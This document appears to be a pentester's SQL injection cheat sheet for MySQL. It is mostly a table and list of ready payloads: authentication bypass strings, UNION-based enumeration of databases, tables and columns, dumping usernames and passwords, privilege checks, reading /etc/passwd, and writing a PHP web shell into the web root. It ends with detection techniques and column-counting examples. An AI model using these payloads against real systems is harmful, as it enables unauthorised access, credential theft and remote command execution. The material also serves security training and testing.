## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |



## How to detect SQL injection vulnerabilities
- Submitting the single quote character `'` and looking for errors or other anomalies
- Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
- Submitting Boolean conditions such as `OR 1=1` and `OR 1=2`, and looking for differences in the application's responses.
- Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
- Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.

## UNION BASED
### Determining the number of columns
```
1' ORDER BY 3--+	#True
1' ORDER BY 4--+	#False => Query is only using 3 columns OR ERROR

1' GROUP BY 3--+	#True
1' GROUP BY 4--+	#False => Query is only using 3 columns OR ERROR

' UNION SELECT NULL,NULL,NULL--       #False OR ERROR
' UNION SELECT NULL,NULL,NULL,NULL--  #True Query is only using 4 columns
```
- note the unioned data types in each column must be compatible between the original

### Finding columns with a useful data type
if unioned data type is the same as orginal the the application's response will contain some additional content including the injected string value
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
